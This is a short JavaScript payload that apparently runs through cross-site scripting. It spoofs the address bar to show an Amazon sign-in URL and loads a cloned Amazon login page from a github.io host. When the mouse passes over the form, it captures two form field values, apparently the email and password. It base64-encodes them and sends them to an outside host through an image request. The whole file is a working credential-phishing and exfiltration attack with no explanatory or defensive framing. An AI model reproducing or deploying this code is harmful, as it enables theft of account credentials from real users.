history.pushState('','Amazon Sign-In', '/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2Fref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0')
function log() { 
 var x = document.forms[0];
 var d=[x.elements[11].value,x.elements[13].value];
 (new Image()).src='https://github.com/xss/img.php?data=' + btoa(JSON.stringify(d));
};

fetch("https://trkbkr.github.io/testScan/amazon.html").then(response => response.text()).then((response) => {
	document.body.parentElement.innerHTML=response;
	document.forms[0]["autocomplete"] = "on" ;
	document.forms[0].addEventListener('mouseover',function(){log()});
	})
